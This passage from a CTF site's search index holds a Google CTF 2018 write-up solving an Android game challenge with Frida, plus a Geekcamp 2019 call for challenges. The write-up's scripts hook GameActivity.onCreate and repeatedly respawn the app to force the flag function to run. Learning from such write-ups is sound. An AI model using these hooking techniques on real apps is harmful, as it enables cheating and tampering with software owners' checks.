patched apk file from that.","title":"Solution"},{"location":"googlectf-quals2018/re/shallweplayagame/#using-frida","text":"I decided to use Frida as I didn't really feel like messing with the smali code at the time (wasn't very hard actually, someone else in the team did it). I figured the most convenient way to do it is to hook onCreate , let it initialize the stuff it needs, and then call n() 1000000 times from there. ( n is the original function name of updateScore , m is showFlag ) frida uses javascript to do instrumentation Java.perform(function() { var GameActivity = Java.use('com.google.ctf.shallweplayagame.GameActivity'); GameActivity.onCreate.overload('android.os.Bundle').implementation = function (v) { this.onCreate(v) for (var i = o; i < 1000000; i++) { send(i); this.n(); } }; }) Then, set up a Frida python script to run it. def on_message(message, data): global i, q, changed if message['type'] == 'send': print(\"[*] {0}\".format(message['payload'])) print('[*] Spawning app') device = frida.get_usb_device() pid = device.spawn('com.google.ctf.shallweplayagame') session = device.attach(pid) jscode = open('script.js', 'r').read() script = session.create_script(jscode) script.on('message', on_message) print('[*] Running script') script.load() device.resume(pid) All looks good... until when it reaches around 10000 the app crashes. I suppose maybe using such a hooking approach may mess up garbage collection in the app, causing it to run out of memory.","title":"Using Frida"},{"location":"googlectf-quals2018/re/shallweplayagame/#spawn-app-repeatedly","text":"However, this is rather simply to deal with. I modified the js script to only run n() up to 10000 times, then dump the values of score and byteArray1 , and store them in a global variable. Then, re-run the app and load those values into score and byteArray1 to continue where we ended off. i = 0 q = [] def on_message(message, data): global i, q, changed if message['type'] == 'send': print(\"[*] {0}\".format(message['payload'])) i = message['payload'][0] q = message['payload'][1] changed = True Using a while loop, we can keep spawning the app until we get the flag. while True: if i > 1000000: exit(0) while not changed: pass changed = False jscode = \"\"\" Java.perform(function() { var GameActivity = Java.use('com.google.ctf.shallweplayagame.GameActivity'); o = %d GameActivity.onCreate.overload('android.os.Bundle').implementation = function (v) { this.onCreate(v) %s if (o < 1000000) { for (var i = o; i < o + 20000; i++) { this.n(); } send([i, this.q.value]); } else { this.m(); } }; GameActivity.k.implementation = function () { }; }) \"\"\" % (i, \"this.q.value = Java.array('byte', %s)\" % q if i > 0 else '') print('Spawning app') device = frida.get_usb_device() pid = device.spawn('com.google.ctf.shallweplayagame') session = device.attach(pid) script = session.create_script(jscode) script.on('message', on_message) print('[*] Running script') script.load() device.resume(pid) Full script here .","title":"Spawn app repeatedly"},{"location":"googlectf-quals2018/re/shallweplayagame/#flag","text":"This approach was really slow, it took around half an hour to finally get the flag. In contrast, if I'd just modified the smali code, it would have been complete in less than a second. Nevertheless, I still preferred this solution as it is very easy to code. Then, I can just leave the script to run while doing some other stuff, and come back half an hour to get the flag. Unless I'm familiar with smali, it would have taken some brain effort to modify the code to get the flag.","title":"Flag"},{"location":"organising/geekcamp2019-ctf/call-for-challenges/","text":"Calling for Challenges! Have a really neat idea for a CTF challenge? Drop us a direct message to Ambrose Chua (serverwentdown) via the Geekcamp Slack . We'll be happy to implement your ideas. Not only do you get credit, you'll also get to solve it and gain points for yourself! See you at Geekcamp 2019!","title":"Geekcamp 2019 Call for Challenges"},{"location":"organising/geekcamp2019-ctf/call-for-challenges/#calling-for-challenges","text":"Have a really neat idea for a CTF challenge? Drop us a direct message to Ambrose Chua (serverwentdown) via the Geekcamp Slack . We'll be happy to implement your ideas. Not only do you get credit, you'll also get to solve it and gain points for yourself! See you at Geekcamp 2019!","title":"Calling for Challenges!"}]}